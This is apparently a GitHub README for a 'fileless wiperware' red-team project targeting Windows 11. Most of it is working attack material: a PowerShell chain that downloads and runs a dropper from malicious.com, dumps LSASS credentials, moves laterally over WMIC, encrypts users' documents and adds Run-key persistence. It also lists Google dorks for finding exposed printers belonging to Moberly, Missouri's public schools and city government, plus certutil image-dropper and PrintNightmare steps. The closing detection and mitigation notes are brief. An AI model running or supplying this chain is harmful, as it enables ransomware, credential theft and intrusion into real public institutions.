
# 🚩 Overview

![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)

---

## 🔒 Project NSFW: Net Sharing Fileless Wiperware

### Executive Summary

**Project NSFW** is a red/purple team research initiative that simulates a **fileless malware** framework, purpose-built for **Windows 11** environments. This project is for educational and security research purposes only.

---

This repository enables simulation of a realistic adversary kill chain using MITRE ATT&CK techniques, emphasizing complete fileless operation and stealth.

---

## 🔓 Fileless Ransomware Lab Example (LOLBins in Action)

> **Warning:** This is a synthetic simulation for red team research.  
> **Never run outside of an isolated test lab.**

```powershell
# Initial Access (T1190) - Load dropper via web
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution (T1059.001) - Decode & load payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation (T1548)
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access (T1003.001)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement (T1021.001)
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption (T1486)
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence (T1547.001)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```
## Google Dorks Recon:

# 🖨️ Printer Reconnaissance via Google Dorking  
**Target Location:** Moberly, Missouri  
**Objective:** Identify publicly exposed printer services vulnerable to Windows Print Spooler exploits such as CVE-2021-1675 (PrintNightmare), CVE-2021-34527, and CVE-2022-21999. These exposures can assist in red team assessments, lateral movement staging, or vulnerability management audits.

This technique uses crafted Google Dork queries to uncover unsecured or misconfigured web-based printer interfaces (e.g., HP JetDirect, RICOH Web Image Monitor, Canon UI), often found in public school systems, city infrastructure, or small business networks. These systems may have active Print Spooler services, which can be exploited for privilege escalation or remote code execution via known vulnerabilities.

---

## 🔍 Google Dork Examples (Moberly-Focused)


    inurl:"/hp/device/this.LCDispatcher" "Moberly"
    intitle:"Printer Status" "Moberly Public Schools"
    intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
    inurl:"/printer/main.html" "City of Moberly"
    intitle:"Web Jetadmin" "Moberly"
    inurl:"/printers/" "Moberly"
    inurl:"/PPS/public/" "Moberly"
    intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
    intitle:"PaperCut MF" "Moberly"
    intitle:"Lexmark" inurl:"/printer/" "Moberly"
    intitle:"Canon Remote UI" "Moberly"
    intitle:"EpsonNet Config" "Moberly"

---
## LOLbins Overveiw: 

# 🛠️ LOLBINS Reconnaissance Summary  
**Target Context:** Moberly, Missouri  
**Objective:** Understand and utilize **LOLBins** (Living Off the Land Binaries) as part of stealthy, fileless post-exploitation strategies targeting public infrastructure—such as printers, school networks, or municipal systems—in regions like **Moberly, MO**.

LOLBins are legitimate Windows binaries that come pre-installed and are often trusted by endpoint security tools. Adversaries and red teamers abuse these tools to execute malicious payloads without dropping new files, reducing detection risk. Their misuse is a cornerstone of fileless malware operations and is commonly observed in advanced persistent threat (APT) campaigns.

---

## 📌 Example Use Case – Moberly Print Service Target


    rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry


**Scenario:**
After identifying an exposed printer or print server in Moberly (e.g., via Google Dorking), the attacker uses **`rundll32.exe`**—a trusted binary—to execute a DLL payload from a shared network path. This avoids writing to disk and exploits the Print Spooler service remotely if vulnerable (e.g., CVE-2021-1675).

---

**Note:** LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` should be monitored in high-trust environments like public school or city IT networks, especially when they interact with remote shares or untrusted memory regions.


## Embed and Encoded Dropper:


# Embed & Encode Dropper into Image (Fileless Staging)  
**Context:** Covert delivery of payloads in environments like Moberly, MO public networks using **Windows-native tools** to avoid detection and bypass basic file filtering.

This technique involves embedding a malicious `.7z` archive (containing a DLL or shellcode) inside an image file (e.g., `nsfw.jpg`) and then extracting it on the target system using **LOLBins** like `certutil.exe` and `copy.exe`. This is commonly used in phishing, local access staging, or in lateral movement operations across printer or SMB shares.

---

## 🔐 Dropper Embed Example

1. **Create Combined Payload Locally**
```bash
copy /b nsfw.jpg + payload.7z nsfw.jpg
````

> Appends the `.7z` archive to the end of `nsfw.jpg` without altering image viewability.

2. **Transfer to Target (e.g., exposed printer share or web panel)**

---

## 📤 Decode & Extract on Target Using LOLBins

```cmd
certutil -decode nsfw.jpg dropper.7z
```

> Extracts the embedded `.7z` file from the image.

```cmd
7z x dropper.7z -oC:\Users\Public\
```

> (If 7-Zip is available or dropped via another LOLBin.)

---

## 🎯 Use Case in Moberly Print Scenario

After identifying an exposed printer web interface or open SMB share via Google Dorking in **Moberly, Missouri**, a red teamer can drop `nsfw.jpg` to a public share or printer-accessible directory. A scheduled task, PowerShell execution, or manual `certutil` decoding on the target completes the payload delivery **without touching disk with a .exe** directly.

---

**Note:** This method bypasses traditional filters (e.g., `.exe` blocks) and leverages built-in binaries, making it highly evasive in legacy or lightly monitored environments.


# 🧩 HiveNightmare / Print Spooler Exploits  
**Objective:** Leverage known vulnerabilities in Windows Print Spooler and shadow volume access to escalate privileges and gain unauthorized file access.  

- **CVE-2021-34527 (PrintNightmare):** Enables remote code execution via Print Spooler service by loading malicious DLLs using native API calls like `RpcAddPrinterDriverEx`.
- **CVE-2021-1675:** Initially classified as LPE; later discovered to be RCE under certain configurations.
- **CVE-2021-36934 (HiveNightmare):** Exposes `SAM`, `SYSTEM`, and `SECURITY` hives due to misconfigured ACLs on shadow copies, allowing non-admin users to dump password hashes and escalate.

**Example (Post-Dork Recon – Moberly):**  
If a school or municipal server in Moberly is running a vulnerable print service, the attacker can remotely trigger PrintNightmare to gain SYSTEM-level access or combine HiveNightmare for local hash extraction and lateral escalation.

---

# 💉 Reflective DLL Injection  
**Technique:** Load a malicious DLL directly into memory without touching disk using reflective loaders, avoiding AV/EDR detection.

**Usage Flow:**  
1. Stage DLL using LOLBins (`certutil`, `rundll32`, etc.).
2. Load via reflective injection (e.g., Stephen Fewer's ReflectiveLoader).
3. Execute memory-resident logic such as encryption, wiper payload, or command beaconing.

**Example:**  
```cmd
rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
````

In the context of printer or public infrastructure compromise in Moberly, reflective injection enables stealthy post-exploitation using harvested credentials or lateral movement through mapped drives and spooler service APIs.

---

# 🧠 MITRE ATT\&CK Summary

| Phase                | Technique                               | ID                   | Description                                              |
| -------------------- | --------------------------------------- | -------------------- | -------------------------------------------------------- |
| Initial Access       | Valid Accounts / Drive-by Compromise    | `T1078`, `T1189`     | Compromising public-facing print interfaces              |
| Execution            | DLL Side-Loading / LOLBins              | `T1218`, `T1055.001` | Running DLLs reflectively via trusted binaries           |
| Privilege Escalation | Print Spooler Exploits / Hive ACL Abuse | `T1068`, `T1003.002` | SYSTEM-level access and SAM hash extraction              |
| Defense Evasion      | Fileless Execution / Obfuscated Files   | `T1027`, `T1202`     | Encoded payloads delivered via `certutil`, `mshta`, etc. |
| Credential Access    | LSASS Dumping / SAM Hive Access         | `T1003`              | Credential dumping post HiveNightmare                    |
| Lateral Movement     | SMB/Net Share Enumeration               | `T1021.002`          | Spread via printer shares or spooler enumeration         |
| Impact               | Data Destruction / Encryption           | `T1485`, `T1486`     | Fileless wiperware triggered via DLL payloads            |

---

# 🛡️ Detection & Mitigation Strategy

## 🔍 Detection

* **Sysmon + Sigma Rules:**

  * Monitor `rundll32.exe` loading non-system DLLs
  * Watch for abnormal `certutil.exe`, `regsvr32.exe`, `mshta.exe` usage
  * Track shadow copy access from non-admin users (HiveNightmare)

* **SIEM Queries (e.g., ELK/Splunk):**

  * Searches for execution from public shares (`\\UNC\path`)
  * Parent-child process anomalies (`explorer.exe` → `rundll32.exe`)
  * Base64/hex-encoded command usage in PowerShell or CMD

## 🛡️ Mitigation

* Disable Print Spooler on systems where not required:

  ```cmd
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```
* Patch CVEs via Windows Update or GPO.
* Apply ACL hardening to `C:\Windows\System32\config\` and disable shadow volume copy exposure.
* Implement application control (AppLocker, WDAC) to restrict use of LOLBins.
* Use endpoint solutions that detect **reflective loading behavior**, not just file signatures.

---

**Conclusion:**
This full attack chain demonstrates how exposed infrastructure (e.g., in Moberly) can be exploited using fileless techniques, built-in binaries, and unpatched CVEs. Defensive teams should prioritize visibility into native tool abuse, privilege escalation paths, and encoded payload delivery patterns.

```
```



### ⚠️ Legal Disclaimer

All code, content, and techniques provided in this project are strictly for **educational** and **authorized penetration testing** purposes only. Usage must be confined to **isolated lab environments** and must comply with all relevant laws and regulations.

---

## 🧭 Additional Resources

* [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
* [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
* [MITRE ATT&CK: S0697](https://attack.mitre.org/software/S0697/)
* [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
* [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)

---

### 📚 Print Spooler CVEs

* [SysNightmare](https://github.com/GossiTheDog/SystemNightmare)
* [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
* [PrintSpoofer 2](https://github.com/dievus/printspoofer)
* [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)

